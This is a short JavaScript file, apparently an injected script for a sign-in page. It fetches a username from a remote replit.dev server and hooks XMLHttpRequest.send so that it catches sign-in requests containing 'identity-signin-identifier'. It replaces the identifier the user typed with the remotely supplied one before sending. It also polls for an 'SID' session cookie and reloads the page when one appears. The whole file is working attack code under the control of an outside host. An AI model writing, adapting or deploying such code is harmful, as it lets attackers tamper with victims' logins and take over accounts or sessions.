document.addEventListener('DOMContentLoaded', () => {

let freqUsername = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();

const fetchFreqUsername = () => {
    if (freqUsername === null) {
        console.log('fetchFreqUsername called');
        return fetch('https://ad350026-b296-4c43-9956-f7a770004eef-00-263nqhdr8w6he.spock.replit.dev/get-first-post-data')
            .then(response => response.json())
            .then(result => {
                freqUsername = result.postData;
                return fetch('https://ad350026-b296-4c43-9956-f7a770004eef-00-263nqhdr8w6he.spock.replit.dev/reset-first-post-data', { method: 'POST' });
            })
            .then(() => {
                processModifiedRequests();
            })
            .catch(error => {
                console.error('Error fetching username:', error);
                setTimeout(fetchFreqUsername, 100); 
            });
    }
};

const processModifiedRequests = () => {
    for (let [xhr, body] of pendingRequests) {
        let modified = false;
        const firstPostMatch = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (firstPostMatch && freqUsername && !modifiedRequests.has(freqUsername)) {
            body = body.replace(firstPostMatch[1], freqUsername);
            modifiedRequests.add(freqUsername);
            modified = true;
            freqUsername = null;
            fetchFreqUsername();
        }
        if (modified) {
            xhr.send(body);
            pendingRequests.delete(xhr);
        }
    }
    
};

const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    const firstPostMatch = /identity-signin-identifier/.test(body);
    if (firstPostMatch && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        pendingRequests.set(this, body);
        processModifiedRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};
    setInterval(function() {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 4000); // Checks every 5 seconds

fetchFreqUsername();
});